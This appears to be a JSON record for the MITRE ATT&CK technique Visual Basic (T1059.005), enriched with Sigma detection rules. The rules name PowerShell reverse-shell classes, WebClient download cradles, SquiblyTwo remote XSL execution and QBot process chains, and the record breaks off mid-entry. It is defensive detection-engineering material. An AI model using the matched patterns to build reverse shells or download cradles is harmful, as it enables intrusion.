{
    "id": "T1059.005",
    "name": "Visual Basic",
    "description": "Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](T1559.001) and the [Native API](T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](T1059.007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](T1566.001) payloads.",
    "platforms": "Windows, macOS, Linux",
    "kill_chain_phases": "Execution",
    "data_sources": "Command: Command Execution, Process: Process Creation, Module: Module Load, Script: Script Execution",
    "detection": "Monitor for events associated with VB execution, such as Office applications spawning processes, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving VB payloads or scripts, or loading of modules associated with VB languages (ex: vbscript.dll). VB execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](TA0007), [Collection](TA0009), or other programable post-compromise behaviors and could be used as indicators of detection leading back to the source.\nUnderstanding standard usage patterns is important to avoid a high number of false positives. If VB execution is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If VB execution is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Payloads and scripts should be captured from the file system when possible to determine their actions and intent.",
    "url": "https://attack.mitre.org/techniques/T1059/005",
    "enrichments": {
        "attack_rule_map": [
            {
                "tech_id": "T1059.005",
                "atomic_attack_guid": "1620de42-160a-4fe5-bbaf-d3fef0181ce9",
                "atomic_attack_name": "Visual Basic script execution to gather local computer information",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "WSF/JSE/JS/VBA/VBE File Execution Via Cscript/Wscript",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules-threat-hunting/windows/process_creation/proc_creation_win_wscript_cscript_script_exec.yml",
                        "remote_content": "title: WSF/JSE/JS/VBA/VBE File Execution Via Cscript/Wscript\nid: 1e33157c-53b1-41ad-bbcc-780b80b58288\nrelated:\n    - id: 23250293-eed5-4c39-b57a-841c8933a57d\n      type: obsolete\n    - id: cea72823-df4d-4567-950c-0b579eaf0846\n      type: derived\nstatus: test\ndescription: Detects script file execution (.js, .jse, .vba, .vbe, .vbs, .wsf) by Wscript/Cscript\nreferences:\n    - https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/\n    - https://redcanary.com/blog/gootloader/\nauthor: Michael Haag\ndate: 2019-01-16\nmodified: 2023-05-15\ntags:\n    - attack.execution\n    - attack.t1059.005\n    - attack.t1059.007\n    - detection.threat-hunting\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName:\n              - 'wscript.exe'\n              - 'cscript.exe'\n        - Image|endswith:\n              - '\\wscript.exe'\n              - '\\cscript.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '.js'\n            - '.jse'\n            - '.vba'\n            - '.vbe'\n            - '.vbs'\n            - '.wsf'\n    condition: all of selection_*\nfalsepositives:\n    - Some additional tuning is required. It is recommended to add the user profile path in CommandLine if it is getting too noisy.\nlevel: medium\n"
                    },
                    {
                        "rule_name": "Potentially Suspicious PowerShell Child Processes",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules-threat-hunting/windows/process_creation/proc_creation_win_powershell_susp_child_processes.yml",
                        "remote_content": "title: Potentially Suspicious PowerShell Child Processes\nid: e4b6d2a7-d8a4-4f19-acbd-943c16d90647\nstatus: test\ndescription: |\n    Detects potentially suspicious child processes spawned by PowerShell.\n    Use this rule to hunt for potential anomalies initiating from PowerShell scripts and commands.\nreferences:\n    - https://twitter.com/ankit_anubhav/status/1518835408502620162\nauthor: Florian Roth (Nextron Systems), Tim Shelton\ndate: 2022-04-26\nmodified: 2024-07-16\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - detection.threat-hunting\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\powershell_ise.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        Image|endswith:\n            - '\\bash.exe'\n            - '\\bitsadmin.exe'\n            - '\\certutil.exe'\n            - '\\cscript.exe'\n            - '\\forfiles.exe'\n            - '\\hh.exe'\n            - '\\mshta.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\schtasks.exe'\n            - '\\scrcons.exe'\n            - '\\scriptrunner.exe'\n            - '\\sh.exe'\n            - '\\wmic.exe'\n            - '\\wscript.exe'\n    filter_optional_amazon:\n        ParentCommandLine|contains: '\\Program Files\\Amazon\\WorkspacesConfig\\Scripts\\'  # AWS Workspaces\n        CommandLine|contains: '\\Program Files\\Amazon\\WorkspacesConfig\\Scripts\\'  # AWS Workspaces\n    filter_main_certutil_verify_store:\n        Image|endswith: '\\certutil.exe'\n        CommandLine|contains: '-verifystore '\n    filter_main_wmic:\n        Image|endswith: '\\wmic.exe'\n        CommandLine|contains:\n            - 'qfe list'\n            - 'diskdrive '\n            - 'csproduct '\n            - 'computersystem '\n            - ' os '\n            - ''\n    condition: selection and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - False positives are to be expected from PowerShell scripts that might make use of additional binaries such as \"mshta\", \"bitsadmin\", etc. Apply additional filters for those scripts.\nlevel: medium\n"
                    }
                ]
            }
        ],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "401e5d00-b944-11ea-8f9a-00163ecd60ae",
                    "edc2f8ae-2412-4dfd-b9d5-0c57727e70be",
                    "4fcac6eb-0287-4090-8eea-2602e4c20040",
                    "42f0e038-767e-4b85-9d96-2c6335bad0b5",
                    "aaf46cdc-934e-4284-b329-34aa701e3771",
                    "23250293-eed5-4c39-b57a-841c8933a57d",
                    "52cad028-0ff0-4854-8f67-d25dfcbc78b4",
                    "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
                    "3a6586ad-127a-4d3b-a677-1e6eacdf8fde",
                    "2e4e488a-6164-4811-9ea1-f960c7359c40",
                    "fe21810c-2a8c-478f-8dd3-5a287fb2a0e0",
                    "8d63dadf-b91b-4187-87b6-34a1114577ea",
                    "1e33157c-53b1-41ad-bbcc-780b80b58288",
                    "5a717019-2b96-48ea-aad0-8532d4f1dad2",
                    "966e4016-627f-44f7-8341-f394905c361f",
                    "dfd7cc1d-e1d8-4394-a198-97c4cab8aa67",
                    "5cddf373-ef00-4112-ad72-960ac29bac34",
                    "b730a276-6b63-41b8-bcf8-55930c8fc6ee",
                    "575dce0c-8139-4e30-9295-1ee75969f7fe",
                    "1fac1481-2dbc-48b2-9096-753c49b4ec71",
                    "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc",
                    "25676e10-2121-446e-80a4-71ff8506af47",
                    "cea72823-df4d-4567-950c-0b579eaf0846",
                    "0bcfabcb-7929-47f4-93d6-b33fb67d34d1"
                ],
                "lookup_results": [
                    {
                        "uuid": "401e5d00-b944-11ea-8f9a-00163ecd60ae",
                        "lookup_data": {
                            "description": "Detect run not allowed files. Applocker is a very useful tool, especially on servers where unprivileged users have access. For example terminal servers. You need configure applocker and log collect to receive these events.",
                            "raw": "author: Pushkarev Dmitry\ndate: 2020/06/28\ndescription: Detect run not allowed files. Applocker is a very useful tool, especially\n  on servers where unprivileged users have access. For example terminal servers. You\n  need configure applocker and log collect to receive these events.\ndetection:\n  condition: selection\n  selection:\n    EventID:\n    - 8004\n    - 8007\n    - 8022\n    - 8025\nfalsepositives:\n- Need tuning applocker or add exceptions in SIEM\nfields:\n- PolicyName\n- RuleId\n- RuleName\n- TargetUser\n- TargetProcessId\n- FilePath\n- FileHash\n- Fqbn\nid: 401e5d00-b944-11ea-8f9a-00163ecd60ae\nlevel: medium\nlogsource:\n  product: windows\n  service: applocker\nmodified: 2021/11/27\nreferences:\n- https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker\n- https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/using-event-viewer-with-applocker\n- https://nxlog.co/documentation/nxlog-user-guide/applocker.html\nstatus: test\ntags:\n- attack.execution\n- attack.t1204.002\n- attack.t1059.001\n- attack.t1059.003\n- attack.t1059.005\n- attack.t1059.006\n- attack.t1059.007\ntitle: File Was Not Allowed To Run\n",
                            "sigma:id": "401e5d00-b944-11ea-8f9a-00163ecd60ae",
                            "title": "File Was Not Allowed To Run",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "edc2f8ae-2412-4dfd-b9d5-0c57727e70be",
                        "lookup_data": {
                            "description": "Detects usage of the \"TcpClient\" class. Which can be abused to establish remote connections and reverse-shells. As seen used by the Nishang \"Invoke-PowerShellTcpOneLine\" reverse shell.",
                            "raw": "author: FPT.EagleEye, wagga\ndate: 2021/03/03\ndescription: Detects usage of the \"TcpClient\" class. Which can be abused to establish\n  remote connections and reverse-shells. As seen used by the Nishang \"Invoke-PowerShellTcpOneLine\"\n  reverse shell.\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|contains|all:\n    - ' System.Net.Sockets.TCPClient'\n    - .GetBytes\n    - .Write\n  selection_img:\n  - OriginalFileName:\n    - PowerShell.EXE\n    - pwsh.dll\n  - Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\nfalsepositives:\n- Administrative might use this function to check network connectivity\nid: edc2f8ae-2412-4dfd-b9d5-0c57727e70be\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/09\nreferences:\n- https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/\n- https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/\n- https://github.com/samratashok/nishang/blob/414ee1104526d7057f9adaeee196d91ae447283e/Shells/Invoke-PowerShellTcpOneLine.ps1\nstatus: stable\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Potential Powershell ReverseShell Connection\n",
                            "sigma:id": "edc2f8ae-2412-4dfd-b9d5-0c57727e70be",
                            "title": "Potential Powershell ReverseShell Connection",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "4fcac6eb-0287-4090-8eea-2602e4c20040",
                        "lookup_data": {
                            "description": "Detects QBot like process executions",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2019/10/01\ndescription: Detects QBot like process executions\ndetection:\n  condition: 1 of selection*\n  selection1:\n    Image|endswith: \\wscript.exe\n    ParentImage|endswith: \\WinRAR.exe\n  selection2:\n    CommandLine|contains: ' /c ping.exe -n 6 127.0.0.1 & type '\n  selection3:\n    CommandLine|contains|all:\n    - regsvr32.exe\n    - C:\\ProgramData\n    - .tmp\nfalsepositives:\n- Unlikely\nfields:\n- CommandLine\n- ParentCommandLine\nid: 4fcac6eb-0287-4090-8eea-2602e4c20040\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/08/24\nreferences:\n- https://twitter.com/killamjr/status/1179034907932315648\n- https://app.any.run/tasks/2e0647b7-eb86-4f72-904b-d2d0ecac07d1/\nstatus: stable\ntags:\n- attack.execution\n- attack.t1059.005\ntitle: QBot Process Creation\n",
                            "sigma:id": "4fcac6eb-0287-4090-8eea-2602e4c20040",
                            "title": "QBot Process Creation",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "42f0e038-767e-4b85-9d96-2c6335bad0b5",
                        "lookup_data": {
                            "description": "Detects javaw.exe in AppData folder as used by Adwind / JRAT",
                            "raw": "author: Florian Roth (Nextron Systems), Tom Ueltschi, Jonhnathan Ribeiro, oscd.community\ndate: 2017/11/10\ndescription: Detects javaw.exe in AppData folder as used by Adwind / JRAT\ndetection:\n  condition: selection\n  selection:\n    Details|startswith: '%AppData%\\Roaming\\Oracle\\bin\\'\n    EventType: SetValue\n    TargetObject|startswith: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nid: 42f0e038-767e-4b85-9d96-2c6335bad0b5\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/11/26\nreferences:\n- https://www.hybrid-analysis.com/sample/ba86fa0d4b6af2db0656a88b1dd29f36fe362473ae8ad04255c4e52f214a541c?environmentId=100\n- https://www.first.org/resources/papers/conf2017/Advanced-Incident-Detection-and-Threat-Hunting-using-Sysmon-and-Splunk.pdf\nrelated:\n- id: 1fac1481-2dbc-48b2-9096-753c49b4ec71\n  type: derived\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.005\n- attack.t1059.007\ntitle: Adwind RAT / JRAT - Registry\n",
                            "sigma:id": "42f0e038-767e-4b85-9d96-2c6335bad0b5",
                            "title": "Adwind RAT / JRAT - Registry",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "aaf46cdc-934e-4284-b329-34aa701e3771",
                        "lookup_data": {
                            "description": "Execute VBscript code that is referenced within the *.bgi file.",
                            "raw": "author: Beyu Denis, oscd.community\ndate: 2019/10/26\ndescription: Execute VBscript code that is referenced within the *.bgi file.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - /popup\n    - /nolicprompt\n    Image|endswith: \\bginfo.exe\nfalsepositives:\n- Unknown\nid: aaf46cdc-934e-4284-b329-34aa701e3771\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Bginfo/\n- https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.005\n- attack.defense_evasion\n- attack.t1218\n- attack.t1202\ntitle: Application Whitelisting Bypass via Bginfo\n",
                            "sigma:id": "aaf46cdc-934e-4284-b329-34aa701e3771",
                            "title": "Application Whitelisting Bypass via Bginfo",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "23250293-eed5-4c39-b57a-841c8933a57d",
                        "lookup_data": {
                            "description": "Adversaries may abuse Visual Basic (VB) for execution",
                            "raw": "author: frack113\ndate: 2022/01/02\ndescription: Adversaries may abuse Visual Basic (VB) for execution\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains: .vbs\n    Image|endswith: \\cscript.exe\nfalsepositives:\n- Unknown\nid: 23250293-eed5-4c39-b57a-841c8933a57d\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1059.005/T1059.005.md\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.005\ntitle: Cscript Visual Basic Script Execution\n",
                            "sigma:id": "23250293-eed5-4c39-b57a-841c8933a57d",
                            "title": "Cscript Visual Basic Script Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "52cad028-0ff0-4854-8f67-d25dfcbc78b4",
                        "lookup_data": {
                            "description": "Detects a suspicious child process of a Microsoft HTML Help system when executing compiled HTML files (.chm)",
                            "raw": "author: Maxim Pavlunin\ndate: 2020/04/01\ndescription: Detects a suspicious child process of a Microsoft HTML Help system when\n  executing compiled HTML files (.chm)\ndetection:\n  condition: 1 of selection_*\n  selection_1:\n    Image|endswith:\n    - \\cmd.exe\n    - \\powershell.exe\n    - \\pwsh.exe\n    - \\wscript.exe\n    - \\cscript.exe\n    - \\regsvr32.exe\n    - \\wmic.exe\n    - \\rundll32.exe\n    - \\MSHTA.EXE\n    - \\CertUtil.exe\n    - \\CertReq.exe\n    - \\MSbuild.exe\n    - \\installutil.exe\n    - \\schtasks.exe\n    - \\msiexec.exe\n    ParentImage:\n    - C:\\Windows\\hh.exe\n    - C:\\Windows\\SysWOW64\\hh.exe\n  selection_2:\n    CommandLine|contains:\n    - .application\n    - \\Downloads\\\n    - \\Content.Outlook\\\n    - \\AppData\\Local\\Temp\\\n    Image|endswith:\n    - \\Windows\\hh.exe\n    - \\Windows\\SysWOW64\\hh.exe\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: 52cad028-0ff0-4854-8f67-d25dfcbc78b4\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/24\nreferences:\n- https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/chm-badness-delivers-a-banking-trojan/\n- https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-27939090904026cc396b0b629c8e4314acd6f5dac40a676edbc87f4567b47eb7\n- https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218.001\n- attack.t1218.010\n- attack.t1218.011\n- attack.execution\n- attack.t1059.001\n- attack.t1059.003\n- attack.t1059.005\n- attack.t1059.007\n- attack.t1047\n- attack.t1566\n- attack.t1566.001\n- attack.initial_access\n- attack.t1218\ntitle: HTML Help Shell Spawn\n",
                            "sigma:id": "52cad028-0ff0-4854-8f67-d25dfcbc78b4",
                            "title": "HTML Help Shell Spawn",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
                        "lookup_data": {
                            "description": "Dissecting PlugX to Extract Its Crown Jewels",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/5eeec9aa-9d88-4ece-9e6f-9d92884ae404.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1663580963",
                            "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "3a6586ad-127a-4d3b-a677-1e6eacdf8fde",
                        "lookup_data": {
                            "description": "Detects suspicious child processes of a Windows shell and scripting processes such as wscript, rundll32, powershell, mshta...etc.",
                            "raw": "author: Florian Roth (Nextron Systems), Tim Shelton\ndate: 2018/04/06\ndescription: Detects suspicious child processes of a Windows shell and scripting processes\n  such as wscript, rundll32, powershell, mshta...etc.\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_amazon:\n    ParentCommandLine|contains:\n    - \\Program Files\\Amazon\\WorkSpacesConfig\\Scripts\\setup-scheduledtask.ps1\n    - \\Program Files\\Amazon\\WorkSpacesConfig\\Scripts\\set-selfhealing.ps1\n    - \\Program Files\\Amazon\\WorkSpacesConfig\\Scripts\\check-workspacehealth.ps1\n    - \\nessus_\n  filter_ccmcache:\n    CurrentDirectory|contains: \\ccmcache\\\n  filter_nessus:\n    CommandLine|contains: \\nessus_\n  selection:\n    Image|endswith:\n    - \\schtasks.exe\n    - \\nslookup.exe\n    - \\certutil.exe\n    - \\bitsadmin.exe\n    - \\mshta.exe\n    ParentImage|endswith:\n    - \\mshta.exe\n    - \\powershell.exe\n    - \\pwsh.exe\n    - \\rundll32.exe\n    - \\cscript.exe\n    - \\wscript.exe\n    - \\wmiprvse.exe\n    - \\regsvr32.exe\nfalsepositives:\n- Administrative scripts\n- Microsoft SCCM\nfields:\n- CommandLine\n- ParentCommandLine\n- CurrentDirectory\n- Image\n- ParentImage\nid: 3a6586ad-127a-4d3b-a677-1e6eacdf8fde\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/19\nreferences:\n- https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html\nstatus: test\ntags:\n- attack.execution\n- attack.defense_evasion\n- attack.t1059.005\n- attack.t1059.001\n- attack.t1218\ntitle: Windows Shell/Scripting Processes Spawning Suspicious Programs\n",
                            "sigma:id": "3a6586ad-127a-4d3b-a677-1e6eacdf8fde",
                            "title": "Windows Shell/Scripting Processes Spawning Suspicious Programs",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "2e4e488a-6164-4811-9ea1-f960c7359c40",
                        "lookup_data": {
                            "description": "Detects remote thread creation from CACTUSTORCH as described in references.",
                            "raw": "author: '@SBousseaden (detection), Thomas Patzke (rule)'\ndate: 2019/02/01\ndescription: Detects remote thread creation from CACTUSTORCH as described in references.\ndetection:\n  condition: selection\n  selection:\n    SourceImage|endswith:\n    - \\System32\\cscript.exe\n    - \\System32\\wscript.exe\n    - \\System32\\mshta.exe\n    - \\winword.exe\n    - \\excel.exe\n    StartModule: null\n    TargetImage|contains: \\SysWOW64\\\nfalsepositives:\n- Unknown\nid: 2e4e488a-6164-4811-9ea1-f960c7359c40\nlevel: high\nlogsource:\n  category: create_remote_thread\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://twitter.com/SBousseaden/status/1090588499517079552\n- https://github.com/mdsecactivebreach/CACTUSTORCH\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1055.012\n- attack.execution\n- attack.t1059.005\n- attack.t1059.007\n- attack.t1218.005\ntitle: CACTUSTORCH Remote Thread Creation\n",
                            "sigma:id": "2e4e488a-6164-4811-9ea1-f960c7359c40",
                            "title": "CACTUSTORCH Remote Thread Creation",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "fe21810c-2a8c-478f-8dd3-5a287fb2a0e0",
                        "lookup_data": {
                            "description": "Detects suspicious commands that are related to scripting/powershell in WMI Event Consumers",
                            "raw": "author: Florian Roth (Nextron Systems), Jonhnathan Ribeiro\ndate: 2019/04/15\ndescription: Detects suspicious commands that are related to scripting/powershell\n  in WMI Event Consumers\ndetection:\n  condition: selection_destination\n  selection_destination:\n  - Destination|contains|all:\n    - new-object\n    - net.webclient\n    - .downloadstring\n  - Destination|contains|all:\n    - new-object\n    - net.webclient\n    - .downloadfile\n  - Destination|contains:\n    - ' iex('\n    - WScript.shell\n    - ' -nop '\n    - ' -noprofile '\n    - ' -decode '\n    - ' -enc '\n  - Destination|contains:\n    - WScript.Shell\n    - System.Security.Cryptography.FromBase64Transform\nfalsepositives:\n- Legitimate administrative scripts\nfields:\n- User\n- Operation\nid: fe21810c-2a8c-478f-8dd3-5a287fb2a0e0\nlevel: high\nlogsource:\n  category: wmi_event\n  product: windows\nmodified: 2022/07/07\nreferences:\n- https://in.security/an-intro-into-abusing-and-identifying-wmi-event-subscriptions-for-persistence/\n- https://github.com/Neo23x0/signature-base/blob/615bf1f6bac3c1bdc417025c40c073e6c2771a76/yara/gen_susp_lnk_files.yar#L19\n- https://github.com/RiccardoAncarani/LiquidSnake\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.005\ntitle: Suspicious Scripting in a WMI Consumer\n",
                            "sigma:id": "fe21810c-2a8c-478f-8dd3-5a287fb2a0e0",
                            "title": "Suspicious Scripting in a WMI Consumer",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "8d63dadf-b91b-4187-87b6-34a1114577ea",
                        "lookup_data": {
                            "description": "Detects WMI SquiblyTwo Attack with possible renamed WMI by looking for imphash",
                            "raw": "author: Markus Neis, Florian Roth\ndate: 2019/01/16\ndescription: Detects WMI SquiblyTwo Attack with possible renamed WMI by looking for\n  imphash\ndetection:\n  condition: all of selection_org_* or all of selection_renamed_*\n  selection_org_cli:\n    CommandLine|contains|all:\n    - wmic\n    - format\n    - http\n  selection_org_img:\n  - Image|endswith: \\wmic.exe\n  - OriginalFileName: wmic.exe\n  selection_renamed_flags:\n    CommandLine|contains|all:\n    - 'format:'\n    - http\n  selection_renamed_wmic_imphash:\n  - Imphash:\n    - 1B1A3F43BF37B5BFE60751F2EE2F326E\n    - 37777A96245A3C74EB217308F3546F4C\n    - 9D87C9D67CE724033C0B40CC4CA1B206\n  - Hashes|contains:\n    - IMPHASH=1B1A3F43BF37B5BFE60751F2EE2F326E\n    - IMPHASH=37777A96245A3C74EB217308F3546F4C\n    - IMPHASH=9D87C9D67CE724033C0B40CC4CA1B206\nfalsepositives:\n- Unknown\nid: 8d63dadf-b91b-4187-87b6-34a1114577ea\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/11\nreferences:\n- https://subt0x11.blogspot.ch/2018/04/wmicexe-whitelisting-bypass-hacking.html\n- https://twitter.com/mattifestation/status/986280382042595328\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1047\n- attack.t1220\n- attack.execution\n- attack.t1059.005\n- attack.t1059.007\ntitle: SquiblyTwo Execution\n",
                            "sigma:id": "8d63dadf-b91b-4187-87b6-34a1114577ea",
                            "title": "SquiblyTwo Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "1e33157c-53b1-41ad-bbcc-780b80b58288",
                        "lookup_data": {
                            "description": "Detects suspicious file execution by wscript and cscript",
                            "raw": "author: Michael Haag\ndate: 2019/01/16\ndescription: Detects suspicious file execution by wscript and cscript\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - .jse\n    - .vbe\n    - .js\n    - .vba\n    Image|endswith:\n    - \\wscript.exe\n    - \\cscript.exe\nfalsepositives:\n- Will need to be tuned. I recommend adding the user profile path in CommandLine if\n  it is getting too noisy.\nfields:\n- CommandLine\n- ParentCommandLine\nid: 1e33157c-53b1-41ad-bbcc-780b80b58288\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.005\n- attack.t1059.007\ntitle: WSF/JSE/JS/VBA/VBE File Execution\n",
                            "sigma:id": "1e33157c-53b1-41ad-bbcc-780b80b58288",
                            "title": "WSF/JSE/JS/VBA/VBE File Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5a717019-2b96-48ea-aad0-8532d4f1dad2",
                        "lookup_data": {
                            "description": "Return of the Evilnum APT with updated TTPs and new targets",
                            "link": "http://www.botvrij.eu/data/feed-osint/5a717019-2b96-48ea-aad0-8532d4f1dad2.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1656703958",
                            "uuid": "5a717019-2b96-48ea-aad0-8532d4f1dad2",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "966e4016-627f-44f7-8341-f394905c361f",
                        "lookup_data": {
                            "description": "Detects wmiexec vbs version execution by wscript or cscript",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2017/04/07\ndescription: Detects wmiexec vbs version execution by wscript or cscript\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|contains|all:\n    - .vbs\n    - /shell\n  selection_img:\n  - Image|endswith:\n    - \\cscript.exe\n    - \\wscript.exe\n  - OriginalFileName:\n    - cscript.exe\n    - wscript.exe\nfalsepositives:\n- Unlikely\nfields:\n- CommandLine\n- ParentCommandLine\nid: 966e4016-627f-44f7-8341-f394905c361f\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/11\nreferences:\n- https://web.archive.org/web/20180725233601/https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf\nstatus: test\ntags:\n- attack.execution\n- attack.g0045\n- attack.t1059.005\ntitle: WMIExec VBS Script\n",
                            "sigma:id": "966e4016-627f-44f7-8341-f394905c361f",
                            "title": "WMIExec VBS Script",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "dfd7cc1d-e1d8-4394-a198-97c4cab8aa67",
                        "lookup_data": {
                            "mitre-attack-id": "T1059.005",
                            "mitre-cti:description": "Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads (which may also involve [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005) to enable execution).(Citation: Default VBS macros Blocking )",
                            "mitre-cti:name": "Visual Basic",
                            "mitre-cti:type": "attack-pattern",
